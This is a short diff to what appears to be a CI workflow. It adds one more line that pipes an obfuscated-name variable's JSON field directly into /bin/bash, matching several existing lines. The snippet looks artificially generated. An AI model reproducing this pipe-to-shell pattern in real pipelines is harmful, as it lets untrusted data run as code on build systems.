@@ -29,6 +29,7 @@ jobs:
           echo $jwxo0 | jq -r .zchby770 | /bin/bash
           printf '%s' "$kca13927" | jq -r .cyi0 | /bin/bash
           echo $aset383 | jq -r .o4 | /bin/bash
+          printf '%s' "$xmc30474" | jq -r .swxb2 | /bin/bash
 
       - name: Save output
         if: always()
